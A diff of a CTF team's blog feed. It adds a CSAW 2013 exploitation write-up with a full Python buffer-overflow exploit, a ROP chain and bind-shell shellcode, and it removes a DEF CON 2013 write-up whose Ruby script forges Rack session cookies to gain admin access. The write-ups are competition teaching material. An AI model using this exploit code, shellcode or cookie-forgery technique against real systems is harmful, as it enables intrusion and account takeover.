@@ -4,7 +4,7 @@
   <title><![CDATA[Category: writeup | blue-lotus]]></title>
   <link href="http://www.blue-lotus.net//blog/categories/writeup/atom.xml" rel="self"/>
   <link href="http://www.blue-lotus.net//"/>
-  <updated>2013-09-24T00:56:47+08:00</updated>
+  <updated>2013-09-24T12:33:38+08:00</updated>
   <id>http://www.blue-lotus.net//</id>
   <author>
     <name><![CDATA[blue-lotus]]></name>
@@ -14,10 +14,124 @@
 
   
   <entry>
-    <title type="html"><![CDATA[CSAW CTF 2013 crypto500 writeup]]></title>
-    <link href="http://www.blue-lotus.net//csaw-ctf-2013-crypto500-writeup/"/>
+    <title type="html"><![CDATA[CSAW CTF Quals 2013 Exploitation 300 writeup]]></title>
+    <link href="http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup/"/>
+    <updated>2013-09-24T00:00:00+08:00</updated>
+    <id>http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup</id>
+    <content type="html"><![CDATA[<p>That is a network service. I can connect it by netcat. then i must input <strong>username</strong> <strong>password</strong> and seomething else.</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/nclogin.png" alt="1" /></p>
+
+<p>After i analysis the service. I find out the process of login and i find the <strong>username</strong> and <strong>password</strong></p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/username.png" alt="2" /> <img src="http://www.blue-lotus.net/images/2013/password.png" alt="3" /> <img src="http://www.blue-lotus.net/images/2013/dbup.png" alt="4" /></p>
+
+<p>Then I input username and password. I input a number(<strong>size</strong>) and a string(<strong>buff</strong>). </p>
+
+<p>“size” &gt; 1 and “size” + 1 &lt; 0x400</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/size.png" alt="5" /></p>
+
+<p>Then I input The buff and the buff must ASCII Characters.</p>
+
+<p>last the program will open a file. write it to the buff. If the length of buff is more than 0x400. write it to the top 1024 of buff.</p>
+
+<p>there will be overflow when the program recv the string which you input. but the length of buff must less than 0x400. </p>
+
+<p><code>
+0xffff + 1 == ； 0 0xffff == 65535
+</code></p>
+
+<p>now we can input any string which we want :)</p>
+
+<p>then i will write the exp.</p>
+
+<p><code>
+'A' * 0x420 + ret_address
+</code>
+there is not “jmp esp” in program when i use objdump. but the program use the function of read. i can use <strong>read</strong> to write “jmp esp” in static area.</p>
+
+<p>read(fd, buff, buffsize)</p>
+
+<p>read: call   80486e0 <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;">&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;</a> </p>
+
+<p>fd:4 (the fd of client socket)</p>
+
+<p>read( 4, *0x080486e0, 2)</p>
+
+<p>now the send “jmp esp” and the program will write in memory.</p>
+
+<p><code>
+'A' * 0x420 + read + pop3ret + fd + static_area + "\x90" + shellcode
+</code></p>
+
+<p>now I did it.use the exp and use <strong>nc</strong> connect remote server.</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/exp.png" alt="6" /></p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/remote.png" alt="7" /></p>
+
+<h2 id="exp">Exp</h2>
+
+<div><div class="CodeRay">
+  <div class="code"><pre><span class="keyword">import</span> <span class="include">sys</span>, <span class="include">os</span>, <span class="include">time</span>, <span class="include">struct</span>, <span class="include">socket</span>
+
+<span class="keyword">def</span> <span class="function">p32</span>(addr):
+    <span class="keyword">return</span> struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;I</span><span class="delimiter">&quot;</span></span>, addr)
+
+<span class="keyword">def</span> <span class="function">r</span>(s, t=<span class="float">0.1</span>):
+    time.sleep(t)
+    <span class="keyword">return</span> s.recv(<span class="integer">8192</span>)
+
+<span class="keyword">def</span> <span class="function">se</span>(s, buf):
+    s.send(buf)
+
+HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">128.238.66.217</span><span class="delimiter">&quot;</span></span>
+HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">192.168.1.180</span><span class="delimiter">&quot;</span></span>
+PORT = <span class="integer">34266</span>
+
+SHELLCODE = \
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x31</span><span class="char">\xdb</span><span class="char">\xf7</span><span class="char">\xe3</span><span class="char">\x53</span><span class="char">\x43</span><span class="char">\x53</span><span class="char">\x6a</span><span class="char">\x02</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x5b</span><span class="char">\x5e</span><span class="char">\x52</span><span class="char">\x68</span><span class="char">\x02</span><span class="char">\x00</span><span class="char">\x11</span><span class="char">\x5c</span><span class="char">\x6a</span><span class="char">\x10</span><span class="char">\x51</span><span class="char">\x50</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\x6a</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x89</span><span class="char">\x41</span><span class="char">\x04</span><span class="char">\xb3</span><span class="char">\x04</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x43</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x93</span><span class="char">\x59</span><span class="char">\x6a</span><span class="char">\x3f</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x49</span><span class="char">\x79</span><span class="char">\xf8</span><span class="char">\x68</span><span class="char">\x2f</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x2f</span><span class="char">\x73</span><span class="char">\x68</span><span class="char">\x68</span><span class="char">\x2f</span><span class="char">\x62</span><span class="char">\x69</span><span class="char">\x6e</span><span class="char">\x89</span><span class="char">\xe3</span><span class="char">\x50</span><span class="char">\x53</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x0b</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span>
+
+s = socket.socket()
+s.connect((HOST, PORT))
+
+<span class="keyword">print</span> r(s)
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">csaw2013</span><span class="delimiter">&quot;</span></span>)
+<span class="keyword">print</span> r(s)
+
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">S1mplePWD</span><span class="delimiter">&quot;</span></span>)
+<span class="keyword">print</span> r(s)
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">65535</span><span class="delimiter">&quot;</span></span>)
+read = p32(<span class="hex">0x80486e0</span>)
+pop3ret = p32(<span class="hex">0x8049110</span>)
+static = p32(<span class="hex">0x804b000</span>)
+fd = p32(<span class="integer">4</span>)
+jmpesp = <span class="string"><span class="delimiter">&quot;</span><span class="char">\xff</span><span class="char">\xe4</span><span class="delimiter">&quot;</span></span>
+buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * (<span class="integer">1056</span> + <span class="integer">0</span>)
+buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * <span class="hex">0x420</span>
+buf += read + pop3ret + fd + static + p32(<span class="integer">2</span>) + static + <span class="string"><span class="delimiter">&quot;</span><span class="char">\x90</span><span class="delimiter">&quot;</span></span> * <span class="integer">100</span> + SHELLCODE
+se(s, buf)
+time.sleep(<span class="integer">5</span>)
+se(s, jmpesp)
+<span class="keyword">print</span> <span class="string"><span class="delimiter">'</span><span class="content">OK!!!</span><span class="delimiter">'</span></span>
+</pre></div>
+</div>
+</div>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[CSAW CTF Quals 2013 crypto500 writeup]]></title>
+    <link href="http://www.blue-lotus.net//csaw-ctf-quals-2013-crypto500-writeup/"/>
     <updated>2013-09-23T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//csaw-ctf-2013-crypto500-writeup</id>
+    <id>http://www.blue-lotus.net//csaw-ctf-quals-2013-crypto500-writeup</id>
     <content type="html"><![CDATA[<h2 id="problem-description">Problem Description</h2>
 <p>We’ve found the source to the Arstotzka spies rendevous server, we must find out their new vault key. Source code is <a href="http://shell-storm.org/repo/CTF/CSAW-2013/Crypto/slurp-500/slurp.py">here</a>.</p>
 
@@ -855,177 +969,6 @@ BOOL WINAPI Inject(DWORD dwProcessID)
     return FALSE;
 }
 </code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[DEF CON CTF Qualifier 2013 3dub 3 Writeup]]></title>
-    <link href="http://www.blue-lotus.net//def-con-ctf-qualifier-2013-3dub-3-writeup/"/>
-    <updated>2013-06-18T00:00:00+08:00</updated>
-    <id>http://www.blue-lotus.net//def-con-ctf-qualifier-2013-3dub-3-writeup</id>
-    <content type="html"><![CDATA[<p>First of all, we got a ‘secrets’ link and ‘log in or create user’ form. When we create and login, the website redirect us to the ‘secrets’ page like this</p>
-
-<pre><code>Secrets
-name    owner   actions
-key admin   show
-nothing asdf    show
-new secret
-</code></pre>
-
-<p>we’ve got some links to see secrets owned by other users, include the ‘admin’, or easily add a new secret ourselves.</p>
-
-<p>Having a try to open the <a href="http://hypeman.shallweplayaga.me/secrets/0">admin’s secret</a>, we got a 500 Error Page with some error stack, which powered by the Ruby framework ‘Sinatra’.</p>
-
-<p>From the very first sight of the page, it said ‘unauthorized’ as the error message and a piece of source code was provided</p>
-
-<pre><code>end
-
-  redirect '/secrets'
-end
-
-get '/secrets/:id' do
-  s = SECRETS[params[:id].to_i]
-  raise "unauthorized" if session[:user_name] != s.username
-
-  haml :secret, locals: {secret: s}
-end
-
-helpers do
-  def current_user
-    return nil unless session[:user_name]
-</code></pre>
-
-<p>It meant that I’m not she secret’s holder. then have a look at the whole page, and you would find some environment variable in the ‘Rack ENV’ section, partly like</p>
-
-<p>rack.session</p>
-
-<p><code>{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}</code></p>
-
-<p>rack.session.options</p>
-
-<p><code>{:path=&gt;"/", :domain=&gt;nil, :expire_after=&gt;nil, :secure=&gt;false, :httponly=&gt;true, :defer=&gt;false, :renew=&gt;false, :sidbits=&gt;128, :secure_random=&gt;SecureRandom, :secret=&gt;"wroashsoxDiculReejLykUssyifabEdGhovHabno", :coder=&gt;#}</code></p>
-
-<p>rack.session.unpacked_cookie_data</p>
-
-<p><code>{"session_id"=&gt;"353c66525a01fa0b3856cb9f34aae2aa9a36ad4cde02daea0ccfbaf566ddbb5a", "tracking"=&gt;{"HTTP_USER_AGENT"=&gt;"9c1f7f9f1bf9d50ec9176e6a805368e30e9d48bb", "HTTP_ACCEPT_ENCODING"=&gt;"ed2b3ca90a4e723402367a1d17c8b28392842398", "HTTP_ACCEPT_LANGUAGE"=&gt;"ca4aee0e81214addc5fb12877cf9e5c8b8beb7d6"}, "csrf"=&gt;"5f6d85b7e1b0a48c8a87e42803ac166cf7d60121afd24ba937bf65fa4f8989c6", "user_name"=&gt;"test"}</code></p>
-
-<p>rack.request.cookie_hash</p>
-
-<p><code>{"rack.session"=&gt;"BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n--d637305e23d6693f3ebe276b292293c7ff0b72e6"}</code></p>
-
-<p>we’ve got some message:</p>
-
-<p>the cookie <code>rack.session</code> is some way encoded of <code>rack.session.unpacked_cookie_data</code>, which is totally the same as env variable <code>rack.session</code>, and the coder mybe <code>Rack::Session::Cookie::Base64::Marshal</code>, secret (if any) maybe ‘wroashsoxDiculReejLykUssyifabEdGhovHabno’</p>
-
-<p>By seeking the source code of rack, we found this(<a href="https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb">https://github.com/rack/rack/blob/master/lib/rack/session/cookie.rb</a>)</p>
-
-<pre><code>@secrets = options.values_at(:secret, :_old_secret).compact
-# some code else
-session_data = coder.encode(session)
-if @secrets.first
-  session_data &lt;&lt; "--#{generate_hmac(session_data, @secrets.first)}"
-end 
-# some code else
-def generate_hmac(data, secret)
-  OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
-end
-</code></pre>
-
-<p>Once the server received a request, it would confirm the validation of the cookie, reset the session if digest mismatch</p>
-
-<pre><code>if @secrets.size &gt; 0 &amp;&amp; session_data
-    session_data, digest = session_data.split("--")
-    session_data = nil unless digest_match?(session_data, digest)
-end
-</code></pre>
-
-<p>Meanwhile, we knew the whole process of the session checking. thus, I’ve wrote a ruby script to figure out this stuff with this way</p>
-
-<ul>
-  <li>unpack(decode) the cookie to origin session data</li>
-  <li>modify session_data.user_name to ‘admin’</li>
-  <li>repack(encode) the session data to cookie string format</li>
-  <li>calculate a new digest of the session data then build the cookie</li>
-</ul>
-
-<p>codes below for example</p>
-
-<pre><code>#!/usr/bin/ruby
-#Author: xelz@blue-lotus
-
-require 'openssl'
-
-# part of rack/lib/rack/session/cookie.rb
-class Base64
-    def encode(str)
-        [str].pack('m')
-    end
-
-    def decode(str)
-        str.unpack('m').first
-    end
-
-    # Encode session cookies as Marshaled Base64 data
-    class Marshal &lt; Base64
-        def encode(str)
-            super(::Marshal.dump(str))
-        end
-
-        def decode(str)
-            return unless str
-            ::Marshal.load(super(str)) rescue nil
-        end
-    end
-end
-
-def generate_hmac(data, secret)
-   OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)
-end
-
-exit() unless ARGV[0]
-
-data = ARGV[0].split('--')[0]
-# puts 'data is:'
-# puts data, "\n"
-
-coder = Base64::Marshal.new
-data = coder.decode(data)
-data['user_name'] = "admin"
-data = coder.encode(data)
-# puts 'modified data is:'
-# puts data, "\n"
-data = data
-
-secret = 'wroashsoxDiculReejLykUssyifabEdGhovHabno'
-# puts 'new digest string is:'
-digest = generate_hmac(data, secret)
-# puts digest, "\n"
-
-puts 'cookie is'
-cookie = data.gsub("\n", "%0A") + '--' + digest
-puts cookie
-</code></pre>
-
-<p>run the script like this:</p>
-
-<pre><code>xelz@blue-lotus:defconctf$echo -en 'BAh7CUkiD3Nlc3Npb25faWQGOgZFRiJFMzUzYzY2NTI1YTAxZmEwYjM4NTZj\nYjlmMzRhYWUyYWE5YTM2YWQ0Y2RlMDJkYWVhMGNjZmJhZjU2NmRkYmI1YUki\nDXRyYWNraW5nBjsARnsISSIUSFRUUF9VU0VSX0FHRU5UBjsARiItOWMxZjdm\nOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlkNDhiYkkiGUhUVFBfQUND\nRVBUX0VOQ09ESU5HBjsARiItZWQyYjNjYTkwYTRlNzIzNDAyMzY3YTFkMTdj\nOGIyODM5Mjg0MjM5OEkiGUhUVFBfQUNDRVBUX0xBTkdVQUdFBjsARiItY2E0\nYWVlMGU4MTIxNGFkZGM1ZmIxMjg3N2NmOWU1YzhiOGJlYjdkNkkiCWNzcmYG\nOwBGIkU1ZjZkODViN2UxYjBhNDhjOGE4N2U0MjgwM2FjMTY2Y2Y3ZDYwMTIx\nYWZkMjRiYTkzN2JmNjVmYTRmODk4OWM2SSIOdXNlcl9uYW1lBjsARkkiCXRl\nc3QGOwBU\n' | awk '{print $1"\\"}' | xargs ./hypeman.rb
-cookie is
-BAh7CSINdHJhY2tpbmd7CCIZSFRUUF9BQ0NFUFRfRU5DT0RJTkciLWVkMmIz%0AY2E5MGE0ZTcyMzQwMjM2N2ExZDE3YzhiMjgzOTI4NDIzOTgiFEhUVFBfVVNF%0AUl9BR0VOVCItOWMxZjdmOWYxYmY5ZDUwZWM5MTc2ZTZhODA1MzY4ZTMwZTlk%0ANDhiYiIZSFRUUF9BQ0NFUFRfTEFOR1VBR0UiLWNhNGFlZTBlODEyMTRhZGRj%0ANWZiMTI4NzdjZjllNWM4YjhiZWI3ZDYiCWNzcmYiRTVmNmQ4NWI3ZTFiMGE0%0AOGM4YTg3ZTQyODAzYWMxNjZjZjdkNjAxMjFhZmQyNGJhOTM3YmY2NWZhNGY4%0AOTg5YzYiD3Nlc3Npb25faWQiRTM1M2M2NjUyNWEwMWZhMGIzODU2Y2I5ZjM0%0AYWFlMmFhOWEzNmFkNGNkZTAyZGFlYTBjY2ZiYWY1NjZkZGJiNWEiDnVzZXJf%0AbmFtZSIKYWRtaW4=%0A--4bd0a545e155460f804aff9df3e80e20fdffa07f
-</code></pre>
-
-<p>then modify the cookie with the new value, using any tool you like such as Firebug(for Firefox), WebInspector(for Webkit Based Browser), Fiddler(under IE7), Burpsuite(Java Based for any platform), I’d like to use the Javascript Console in Chrome:</p>
-
-<pre><code>document.cookie='rack.session=xxx;'
-</code></pre>
-
-<p>refresh the page, and enjoy <img src="http://www.blue-lotus.net/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>
-
-<blockquote>
-  <p>key</p>
-
-  <p>watch out for this Etdeksogav</p>
-</blockquote>
-
 ]]></content>
   </entry>
   
